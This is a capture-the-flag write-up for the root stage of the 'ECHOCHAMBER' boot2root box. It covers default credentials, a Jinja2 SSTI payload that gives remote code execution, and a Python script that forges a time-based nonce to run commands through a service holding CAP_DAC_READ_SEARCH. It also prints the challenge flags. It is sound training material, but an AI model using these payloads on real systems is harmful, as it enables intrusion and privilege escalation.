# echochamber-root

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`

---

Target: `10.48.151.156`
Flag format: `isfcr{...}`.

**Status: SOLVED.**

| Flag |
|---|
| `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}` |

This is the **Root** half of the ECHOCHAMBER boot2root. The User half
(`/home/sentinel/*`) is documented separately in `../echochamber-user/writeup.md`; this file
covers the escalation to root and the `/root/root.txt` capture.

---

## 0. Prerequisite (recap of the foothold)

* **Recon:** `22` (OpenSSH 9.2p1) and `80` (nginx → "Anadyne Systems · Alert Review Console").
* **Default creds:** the `/login` page prints `analyst / analyst`; the footer hints that
  "keystroke telemetry via `libechotap.so`" is enabled.
* **SSTI → RCE:** `/api/alert/preview` renders the `body` through Jinja2:
  `{{7*7}}` → `49`; escalate with
  `{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}` →
  RCE as `analyst` (uid=1001, groups `analyst`, `echo-log`).
* **Sentinel primitive:** reading `/opt/sentinel/sentinel.py` (via the SSTI RCE) shows a Unix
  socket `/run/sentinel/ctrl.sock` whose `exec_shell` handler is gated by a **time-based nonce**
  `sha256("{minute_epoch}:{SALT}")[:16]` with `SALT = "sentinel-salt-v1-a3b7c2d9"`, accepting
  ±1 minute of drift. The sentinel runs with **`CAP_DAC_READ_SEARCH`** - it can read *any* file
  regardless of permissions.

Full script and detail: `../echochamber-user/writeup.md`.

---

## 1. The escalation - inherited `CAP_DAC_READ_SEARCH`

The sentinel process holds `CAP_DAC_READ_SEARCH`. Any child process it spawns **inherits that
capability**, and `exec_shell` lets us spawn an arbitrary command as the sentinel user. So we
can read `/root/root.txt` directly through the sentinel socket - no classic privesc required.

Reuse the exact socket call from the User stage (compute the minute nonce, connect, send a
base64 command), swapping the payload:

```python
import hashlib, time, json, socket, base64

t = int(time.time()) // 60
nonce = hashlib.sha256(f"{t}:sentinel-salt-v1-a3b7c2d9".encode()).hexdigest()[:16]
cmd = base64.b64encode(b"cat /root/root.txt").decode()

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall(json.dumps({"op": "shell", "nonce": nonce, "payload": cmd}).encode() + b"\n")
print(s.recv(65536).decode())
s.close()
```

**Root Flag:** `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`

> **Decoys:** `/var/lib/warden/decoy/root.txt` (`isfcr{s0_cl0se_but_s0_f4r}`) and
> `/var/lib/warden/decoy/user.txt` (`isfcr{echoes_sound_the_same}`) are traps planted by the
> "warden" symlink-swapping mechanism. The real flag is only at `/root/root.txt`.

## 2. Attack chain (full)

```
Default creds (analyst/analyst)
  → SSTI in /api/alert/preview (Jinja2)
    → RCE as analyst (uid=1001)
      → Read sentinel.py (source: SALT + nonce algorithm)
        → Compute time-based nonce
          → Connect to /run/sentinel/ctrl.sock
            → exec_shell as sentinel (CAP_DAC_READ_SEARCH)
              → cat /home/sentinel/*  → User Flag
              → cat /root/root.txt    → Root Flag
```

## 3. Takeaway

*"To win the game, play a different game"*: instead of fighting file permissions, abuse the
**capability** (`CAP_DAC_READ_SEARCH`) that a reachable service already holds and passes to its
children. The sentinel socket was the intended root path all along.

